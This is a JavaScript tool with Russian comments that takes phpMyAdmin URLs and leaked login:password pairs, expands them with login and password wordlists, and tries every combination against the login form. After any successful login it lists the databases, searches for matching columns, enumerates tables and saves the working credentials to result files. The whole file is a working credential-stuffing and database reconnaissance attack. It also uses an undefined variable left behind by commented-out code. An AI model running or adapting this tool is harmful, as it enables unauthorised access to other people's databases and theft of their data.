const fs = require('fs');
const cheerio = require("cheerio");
const axios = require("axios");
const winston = require("winston");
require('dotenv').config();

// Настройка логгера
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(info => `${info.timestamp} ${info.level}: ${info.message}`)
    ),
    transports: [
        new winston.transports.Console(),
        new winston.transports.File({ filename: './logs/app.log' })
    ]
});

function readFileIfExists(filename) {
    if (fs.existsSync(filename)) {
        return new Set(
            fs.readFileSync(filename, 'utf-8')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line)
        );
    }
    return new Set();
}

// === Читаем входные данные ===
const mainFile = process.env.MAIN_FILE || "./files/input.txt";
const loginsFile = "./files/logins.txt";
const passwordsFile = "./files/passwords.txt";

// Читаем файлы
const rawLines = readFileIfExists(mainFile);
const logins = readFileIfExists(loginsFile);
const passwords = readFileIfExists(passwordsFile);

let targets = new Set();

// Функция для разбора строки
function parseLine(line) {
    const match = line.match(/^(https?:\/\/[^\s:]+(:\d+)?(?:\/[^\s:]*)?):([^:]+):(.+)$/);
    if (match) {
        const [, url, , login, password] = match;
        return { url, login, password };
    }
    return null;
}

// Обрабатываем строки из input.txt
for (const line of rawLines) {
    const parsed = parseLine(line);
    if (parsed) {
        targets.add(parsed);

        /*// Добавляем зеркальный URL (http <-> https)
        const altUrl = parsed.url.startsWith("http://")
            ? parsed.url.replace("http://", "https://")
            : parsed.url.replace("https://", "http://");
        targets.add({ url: altUrl, login: parsed.login, password: parsed.password });*/
    }
}

// === Генерация всех комбинаций ===
const loginList = [...logins];
const passwordList = [...passwords];

let combinations = new Set();

for (const { url, login, password } of targets) {
    // Оригинальная комбинация
    combinations.add({ url, login, password });

    // Генерация комбинаций с logins.txt и passwords.txt
    passwordList.forEach(extraPassword => {
        combinations.add({ url, login, password: extraPassword }); // Меняем только пароль
    });

    loginList.forEach(extraLogin => {
        combinations.add({ url, login: extraLogin, password }); // Меняем только логин
    });

    /*// Зеркальный URL (http <-> https)
    const altUrl = url.startsWith("http://")
        ? url.replace("http://", "https://")
        : url.replace("https://", "http://");
    combinations.add({ url: altUrl, login, password });*/

    passwordList.forEach(extraPassword => {
        combinations.add({ url: altUrl, login, password: extraPassword }); // Меняем только пароль
    });

    loginList.forEach(extraLogin => {
        combinations.add({ url: altUrl, login: extraLogin, password }); // Меняем только логин
    });
}
// Используем Map для удаления дубликатов
const uniqueMap = new Map();
for (const obj of combinations) {
    const key = JSON.stringify(obj);
    if (!uniqueMap.has(key)) {
        uniqueMap.set(key, obj);
    }
}

// Преобразуем обратно в Set
const uniqueCombinations = new Set(uniqueMap.values());

console.log(`✅ Сформировано ${uniqueCombinations.size} комбинаций для тестирования.`);

class PmaClient {

     phpMyAdminUrl;
     queryUrl;
     cookie;
     login;
     password;
     token;
     pmaCookieVer;
     pma_collation_connection;
     pmaUser_1;
     pmaAuth_1;
     encodedAuth; // для авторизации при ['auth_type'] = 'http'
     session;

    constructor(phpMyAdminUrl, login, password) {
        this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
        this.queryUrl = `${this.phpMyAdminUrl.replace(/index\.php\/?$/, '')}import.php`;
        this.login = login;
        this.password = password;
    }

    updateCookies(newCookies) {
        if (!newCookies) return;

        const cookieMap = {
            cookie: ["phpMyAdmin=", "phpMyAdmin_https="],
            pmaCookieVer: ["pmaCookieVer="],
            pma_collation_connection: ["pma_collation_connection="],
            pmaUser_1: ["pmaUser-1=", "pmaUser-1_https="],
            pmaAuth_1: ["pmaAuth-1=", "pmaAuth-1_https="]
        };

        Object.keys(cookieMap).forEach(key => {
            const foundCookie = newCookies
                .filter(cookie => cookieMap[key].some(prefix => cookie.startsWith(prefix)))
                .pop();

            if (foundCookie) {
                const cookieValue = foundCookie.split(";")[0];
                if (cookieValue.includes("=deleted")) {
                    return;
                }
                this[key] = cookieValue;
            }
        });
        this.session = this.cookie.replace(/phpMyAdmin(_https)?=/, "");
    }


    updateToken(html) {
        const $ = cheerio.load(html);
        const token = $('input[name="token"]').val();
        if (!token) throw new Error("Не удалось извлечь токен.");
        this.token = token;
    }

    // === Функция для авторизации при ['auth_type'] = 'cookie' ===
    loginAndGetCookies = async () => {
        try {
            // Запрос к странице входа
            const response = await axios.get(this.phpMyAdminUrl, {
                headers: {"User-Agent": "Mozilla/5.0"},
            });
            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            //console.log('rawCookies' + rawCookies + '\n');
            if (rawCookies) {
                this.updateCookies(rawCookies);
            }

            // Извлекаем токен из HTML
            this.updateToken(response.data);

            // Отправляем POST-запрос на авторизацию
            const loginResponse = await axios.post(this.phpMyAdminUrl, new URLSearchParams({
                route: "/",
                token: this.token,
                set_session: this.session,
                pma_username: this.login,
                pma_password: this.password,
                server: "1",
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                },
                maxRedirects: 0,
                validateStatus: (status) => true,
            });

            // Обновляем куки
            const newCookies = loginResponse.headers["set-cookie"];
            if (newCookies) {
                this.updateCookies(newCookies)
            }

            // ищем токен в Headers.Location
            const location = loginResponse.headers?.location;
            //console.log('LOCATION: ' + location)
            if (location.includes('token=')) {
                const tokenMatch = location.match(/[?&]token=([^&]+)/);
                this.token = tokenMatch ? tokenMatch[1] : undefined;
                //console.log(`Assigned token from LOCATION: ${this.token}`);
            } else {
            //если нет в Location - делаем Get запрос
                const response1 = await axios.get(this.phpMyAdminUrl, {
                    headers: {
                        "User-Agent": "Mozilla/5.0",
                        Cookie: [this.cookie, this.pmaUser_1, this.pmaAuth_1, 'pma_lang=ru']
                            .filter(Boolean)
                            .join("; ")
                    }
                })
                this.updateToken(response1.data);
                const cookies = response1.headers['set-cookie']
                if (cookies) {
                    this.updateCookies(cookies)
                }
            }
            console.log(`✅ Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
            return true;
        } catch (error) {
            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
            return false;
        }
    };
    // === Функция для авторизации при ['auth_type'] = 'http' ===
    /*loginAndGetCookiesHttp = async () => {
        try {
            // Запрос к странице входа для получения куки
            const response = await axios.get(this.phpMyAdminUrl, {
                headers: { "User-Agent": "Mozilla/5.0" },
                validateStatus: (status) => true, // обрабатываем дальше при 401 без выброса ошибки
            });

            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            if (rawCookies) {
                this.updateCookies(rawCookies)
            }

            // Отправляем GET-запрос на авторизацию
            this.encodedAuth = 'Basic ' + Buffer.from(`${this.login}:${this.password}`).toString('base64');
            const loginResponse = await axios.get(this.phpMyAdminUrl, {
                headers: {
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                    Authorization: this.encodedAuth
                }
            });

            // Извлекаем токен из HTML ответа
            this.updateToken(loginResponse.data);

            console.log(`✅ Авторизация успешна (${this.login}:${this.password}).`);
            return true;
        } catch (error) {
            console.log(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message} -> ${error.stack}`);
            return false;
            //throw error;
        }
    };*/

    // === Функция для выполнения SQL-запросов ===
    executeSQLQuery = async (query) => {
        try {
            const response = await axios.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: query,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,// for http type auth
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error ('Запрос не выполнен')
            // Обрабатываем HTML-ответ
            const $ = cheerio.load(response.data.message);
            const databases = $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
            console.log(`Найденные базы данных (${databases.length}): \x1b[32m${databases.join(", ")}\x1b[0m`);
            //this.updateCookies()
            return databases;

        } catch (error) {
            console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
        }
    }

    // === Функция для поиска колонок в таблицах ===
    findColumnsInTables = async (database, columns) => {

        // Разделяем строку columns на отдельные значения
        const columnsToSearch = columns.split(',').map(col => col.trim());

        // Формируем условия LIKE для каждого значения
        const likeConditions = columnsToSearch.map(col => `COLUMN_NAME LIKE '%${col}%'`).join(' OR ');
        try {
            const response = await axios.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: `SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '${database}' AND (${likeConditions})`,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error('Запрос не выполнен');
            const $ = cheerio.load(response.data.message);
            return $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').map((_, td) => $(td).text().trim()).get();
            }).get();
        } catch (error) {
            logger.error(`Ошибка выполнения SQL-запроса findColumnsInTables: ${error.message}`);
            return [];
        }
    }

    // === Функция для получения списка всех таблиц ===
    getAllTables = async (database) => {
        try {
            const response = await axios.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: `SHOW TABLES FROM \`${database}\``,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    Authorization: this.encodedAuth,
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error('Запрос не выполнен');
            const $ = cheerio.load(response.data.message);
            return $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
        } catch (error) {
            logger.error(`Ошибка выполнения SQL-запроса getAllTables в ${database}: ${error.message}`);
            return [];
        }
    }
}

// === Цикл перебора комбинаций ===
(async () => {
    const results = []; // Массив для хранения результатов таблиц

    for (const { url, login, password } of uniqueCombinations) {
        const client = new PmaClient(url, login, password);
        if (await client.loginAndGetCookies()) {
            const databases = await client.executeSQLQuery("SHOW DATABASES;");
            const entry = {
                url: url,
                login: login,
                password: password,
                databases: {}
            };

            for (const database of databases) {

                // Поиск колонок
                const columnsToFind = 'name, table';
                const foundColumns = await client.findColumnsInTables(database, columnsToFind);
                if (foundColumns.length > 0) {
                    foundColumns.forEach((column) => {
                        fs.appendFileSync('./results/found_columns.txt', `${url}:${login}:${password}|${column}\n`);
                    });
                }

                // Получение списка таблиц
                const tables = await client.getAllTables(database);
                if (tables.length > 0) {
                    entry.databases[database] = tables; // Добавляем таблицы в базу данных
                }
            }
            // Если найдены таблицы, добавляем запись в результаты
            if (Object.keys(entry.databases).length > 0) {
                results.push(entry);
            }
        }
    }

    if (results.length > 0) {
        fs.writeFileSync('./results/all_tables.json', JSON.stringify(results, null, 2));
        logger.info('Результаты таблиц успешно записаны в all_tables.json');
    } else {
        logger.warn('Нет данных для записи в all_tables.json');
    }
})();
